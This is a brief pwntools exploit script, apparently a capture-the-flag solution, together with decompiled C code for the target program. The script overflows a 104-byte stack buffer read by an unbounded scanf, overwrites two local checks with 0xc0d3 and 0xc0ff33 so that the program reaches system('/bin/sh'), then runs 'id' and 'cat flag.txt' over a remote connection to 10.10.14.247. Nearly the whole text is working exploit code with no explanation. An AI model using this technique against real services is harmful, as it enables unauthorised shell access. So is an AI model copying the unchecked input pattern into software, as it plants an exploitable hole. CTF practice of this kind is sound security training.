from pwn import * 

r = remote('10.10.14.247', 9002)

payload = b'A'*104
payload += p32(0xc0d3) + p32(0xc0ff33)

r.recv()
r.sendline(payload)
r.sendline('id')
r.sendline('cat flag.txt')
r.interactive()
'''
void main(void)

{
  undefined local_78 [104];
  int local_10;
  int local_c;
  
  setup();
  banner();
  local_c = 0xbadf00d;
  local_10 = -0x11e2153;
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  __isoc99_scanf(&DAT_00100b66,local_78);
  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}
'''
